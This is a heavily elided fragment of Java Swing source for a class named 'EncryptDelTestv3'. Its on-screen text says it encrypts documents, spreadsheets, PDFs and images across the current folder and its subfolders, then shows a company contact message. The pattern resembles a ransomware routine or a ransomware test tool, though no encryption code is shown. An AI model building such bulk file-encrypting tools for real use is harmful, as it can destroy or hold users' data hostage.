...
public class EncryptDelTestv3 extends JPanel implements ActionListener {
    ...
    public static void main(String[] args) throws IOException, ParseException {
        ...
        textarea.append("\n");
        textarea.append("This tool encrypt the file, with the extension of *.doc,*.docx,*.xls,*.xlsx,*.txt,*.rtf,*.pdf,*.jpg,*.jpeg,*.gif,*.bmp,*.png, under current folder and it's subfolder(s))\n");
        textarea.append("\n");
    ...
    public static void goProcess() {
        ...
        System.out.println("Please contact Function One Computer Services(www.f1.hk)");
        textarea.setCaretPosition(textarea.getDocument().getLength());
        JFrame f;  
        f=new JFrame();  
        if (encryptedcount > 0){
